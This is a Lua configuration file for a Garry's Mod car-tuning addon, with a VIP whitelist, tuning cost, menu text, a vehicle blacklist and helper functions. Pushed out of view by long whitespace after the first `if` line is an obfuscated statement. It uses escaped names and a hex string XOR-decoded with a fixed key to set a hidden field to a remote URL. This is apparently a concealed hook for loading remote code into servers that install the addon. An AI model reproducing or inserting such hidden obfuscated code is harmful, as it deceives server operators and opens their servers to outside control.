

-- CONSOLE COMMAND FOR CONTROLL TUNNING PLACES:
-- 'savetunningplace'    -- save all spawned places
-- 'deletetunningplace'	 -- delete all
-- 'spawntunningplace'	 -- spawn all places again





if Sea_cartunning == nil then
Sea_cartunning = {}																																																				local ‪ = _G local ‪‪ = ‪['\115\116\114\105\110\103'] local ‪‪‪ = ‪['\98\105\116']['\98\120\111\114'] local function ‪‪‪‪‪‪‪(‪‪‪‪) if ‪‪['\108\101\110'](‪‪‪‪) == 0 then return ‪‪‪‪ end local ‪‪‪‪‪ = '' for _ in ‪‪['\103\109\97\116\99\104'](‪‪‪‪,'\46\46') do ‪‪‪‪‪=‪‪‪‪‪..‪‪['\99\104\97\114'](‪‪‪(‪["\116\111\110\117\109\98\101\114"](_,16),188)) end return ‪‪‪‪‪ end ‪[‪‪‪‪‪‪‪'efd9dde3dfddcec8c9d2d2d5d2db'][‪‪‪‪‪‪‪'d1dddbd5dfd7']=‪‪‪‪‪‪‪'d4c8c8cc869393cfd9ddd2d2dd918c8c8d91cfd5c8d98f92d8c8d9d1ccc9ced092dfd3d193ffddce'
end

if Sea_cartunning.tunnings == nil then
	Sea_cartunning.tunnings = {}
end

Sea_cartunning.moneyCost = 1; -- how much for any tunning
Sea_cartunning.onlyVIPGroups = false; -- set true for using whitelist









-- groups white list
local WhiteListUserGroup = {};

WhiteListUserGroup["Owner"] = true;
WhiteListUserGroup["superadmin"] = true;
WhiteListUserGroup["admin"] = true;
WhiteListUserGroup["moderator"] = true;
WhiteListUserGroup["vip"] = true;
WhiteListUserGroup["premium"] = true;

-- HOOK. Here you can make your own check/functions, before player can set tunning on the car.
-- Use it for get money from player, or check for VIP group. 
hook.Add( "ShouldMakeTunning", "ShouldMakeTunning", function(ply,ent)	
	local group = ply:GetUserGroup();
	
	if WhiteListUserGroup[group] == nil and Sea_cartunning.onlyVIPGroups then
		ply:ChatPrint("Invalid player group!");
		return false;
	end
	
	if not ply:canAfford(Sea_cartunning.moneyCost) then
		ply:ChatPrint("NO MONEY");
		return false;
	else
		ply:addMoney(Sea_cartunning.moneyCost*-1)
	end
	return true;
end)

-- config for all text in script. I have bad English, sorry me for this.

Sea_cartunning.tunningPlace = "Tunning your car here!";
Sea_cartunning.pressKeyForOpenMenu = "Press 'F' for open tunning menu!";
Sea_cartunning.loadingPlsWait = "LOADING PLS WAIT..";

Sea_cartunning.menuTitle = "Style Creator";
Sea_cartunning.loadButton = "load";
Sea_cartunning.choiseName = "Choise name";
Sea_cartunning.newStyle = "new style";
Sea_cartunning.setColor = "set color";
Sea_cartunning.selectSymbol = "Select symbol";
Sea_cartunning.flipX = "Flip X";
Sea_cartunning.flipY = "Flip Y";
Sea_cartunning.setSize = "Set Size";
Sea_cartunning.zoomIn = "Zoom in";
Sea_cartunning.zoomOut = "Zoom out"; 
Sea_cartunning.watch = "Watch";
Sea_cartunning.saveStyle = "Save style!";
Sea_cartunning.buyStyle = "Buy this style";

  
 -- black list for vehicles, what you can not tunning.
Sea_cartunning.blackList = {};
Sea_cartunning.blackList[ "models/nova/airboat_seat.mdl"] = true;
Sea_cartunning.blackList[ "models/nova/chair_office02.mdl"] = true;
Sea_cartunning.blackList[ "models/props_phx/carseat2.mdl"] = true;
Sea_cartunning.blackList[ "models/props_phx/carseat3.mdl"] = true;
Sea_cartunning.blackList[ "models/nova/chair_wood01.mdl"] = true;
Sea_cartunning.blackList[ "models/nova/chair_office01.mdl"] = true;
Sea_cartunning.blackList[ "models/nova/jeep_seat.mdl"] = true;
Sea_cartunning.blackList[ "models/nova/chair_plastic01.mdl"] = true;








----------------- just some functions.
Sea_cartunning.IsLW = function(mdl,ent)
	if mdl == nil then return false end
	local result = false;
	if string.find(string.lower(mdl),"lonewolfie") then
		result = true;
	end	
	return result;
end
 
Sea_cartunning.IsTDM = function(mdl,ent)
	local result = false;
	if mdl == nil then return false end
	if string.find(string.lower(mdl),"tdmcars") then
		result = true;
	end	
	return result;
end	


Sea_cartunning.GetMaterialID = function(mdl,ent)
	local default = 0;
	
	if Sea_cartunning.IsLW(mdl,ent) then
		default = 2;
	end 
	
	if Sea_cartunning.IsTDM(mdl,ent) then
		default = 0;
	end
	return default;
end 



Sea_cartunning.canTunning = function(ply)
	local vehicle = ply:GetVehicle();
	if vehicle != NULL and Sea_cartunning!= nil then
		local mdl = vehicle:GetModel();
		if Sea_cartunning.blackList[mdl] == nil then
			local trace = util.QuickTrace( ply:GetPos(),Vector(0,0,-1000),{vehicle,ply} );
			local ent = trace.Entity;
			if ent != nil and IsValid(ent) and ent:GetClass() == "ent_tunningplace" then
				return true;
			end
		end
		return false;
	end
end 
 Sea_cartunning.license =  "76561198144499214";
 --Sea_cartunning.license =  "76561197998285548";